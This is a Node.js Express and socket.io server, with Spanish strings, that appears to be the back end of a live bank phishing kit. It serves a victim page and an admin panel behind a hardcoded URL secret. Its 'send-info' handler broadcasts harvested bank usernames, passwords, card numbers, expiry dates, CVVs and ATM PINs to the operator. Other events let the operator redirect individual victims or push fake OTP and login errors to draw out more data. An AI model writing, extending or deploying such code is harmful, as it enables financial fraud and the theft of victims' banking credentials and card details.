const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = require('socket.io')(server);

const clients = {};



app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/admin', (req, res) => {
    const verify = req.query.whk_ref;
    if (verify === 'rsl_xttx') {
        res.sendFile(__dirname + '/admin.html');
    } else {
        res.status(403).send('Acceso no autorizado');
    }
});


io.on('connection', (socket) => {
  
    io.emit("sales-notify");

    socket.on('user-connected', (userInfo) => {
        if (userInfo.name !== ""){
           clients[socket.id] = {
              name: userInfo.name,
              connectedAt: new Date()
           };

         io.emit('update-clients', clients);
        }
        
    });

    socket.on('disconnect', () => {
        
        delete clients[socket.id];
        io.emit('update-clients', clients);
    });

    socket.on('send-message', (data) => {
        io.to(data.clientId).emit('receive-message');
    });

    socket.on('send-idcustom', (data) => {
        io.emit('receive-idcustom', data.ccid);
    });

    socket.on('redirect', (data) => {
        io.to(data.clientId).emit('redirect', data.url);
    });

    socket.on('request-info', (data) => {
        io.to(data.clientId).emit('info-request');
       
    });

    socket.on('otp-error', (data) => {
       
        io.to(data.clientId).emit('give-otperror');       
    });

    socket.on('user-error', (data) => {
        io.to(data.clientId).emit('give-usererror');
    });

    socket.on('atm-key', (data) => {
        io.to(data.clientId).emit('give-ccajero');
    });

    socket.on('send-info', (data) => {
      const rid = socket.id;

        io.emit('receive-info', { 
            clientId: rid ,
            tbanco: data.banco,
            tuser: data.user,
            tpass: data.pass,
            cCard: data.cCard,
            fecha: data.Fecha,
            CVV: data.CVV,
            info: data.infos, 
            user: data.userError,
            upw: data.passError, 
            ccaj: data.ccaj,
            namec: data.namec || data.namenow
        });
    });
});



const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log("servidor escuchando");
});
